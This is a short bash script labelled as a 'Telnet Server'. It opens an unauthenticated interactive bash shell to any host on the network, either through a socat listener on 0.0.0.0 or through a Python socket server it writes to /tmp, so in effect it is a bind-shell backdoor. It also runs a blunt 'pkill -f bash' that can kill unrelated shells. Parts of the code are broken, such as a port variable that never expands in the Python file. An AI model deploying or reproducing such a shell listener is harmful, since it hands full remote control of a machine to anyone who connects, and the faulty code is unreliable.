#!/bin/bash

# Configuration
PORT=${1:-2344}

echo -e "\n${GREEN}=== Telnet Server ===${NC}"
echo "Port: ${PORT}"
echo "Binding: 0.0.0.0 (Local + External)"
echo "Time: $(date '+%F %T')"

# Kill existing process
if ss -tlnp 2>/dev/null | grep -q ":${PORT}"; then
    echo -e "\n${YELLOW}Port ${PORT} in use...${NC}"
    pkill -f "${PORT}" 2>/dev/null || pkill -f "bash"
    sleep 1
fi

# Try socat (fastest)
if command -v socat &> /dev/null; then
    echo -e "\n${GREEN}Using ${YELLOW}socat${GREEN}...${NC}"
    socat -T 0 TCP-LISTEN:${PORT},reuse,fork EXEC:bash -i,pty
    while true; do sleep 1; done
else
    echo -e "\n${GREEN}Using ${YELLOW}python3${GREEN}...${NC}"
    
    # Create simple Python server
    cat > /tmp/py_telnet_server.py << 'EOF'
import socket
import subprocess
import os

HOST = '0.0.0.0'
PORT = ${PORT}

print(f"\n[OK] Starting: {HOST}:{PORT}")

sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
sock.bind((HOST, PORT))
sock.listen(5)

print(f"[OK] Listening on socket...")

while True:
    try:
        conn, addr = sock.accept()
        print(f"[OK] CONNECTED: {addr}")
        
        # Direct socket to bash
        subprocess.Popen(
            ['bash', '-i'],
            stdin=conn, stdout=conn, stderr=conn,
            bufsize=1
        ).wait()
        
        conn.close()
    except KeyboardInterrupt:
        print("\n[OK] Stopping...")
        break
    except Exception as e:
        print(f"[WARN] Error: {e}")
        break
EOF
    
    echo "[BASH] Running Python server..."
    python3 /tmp/py_telnet_server.py
fi

echo -e "\n${GREEN}=== Server Ready ===${NC}"
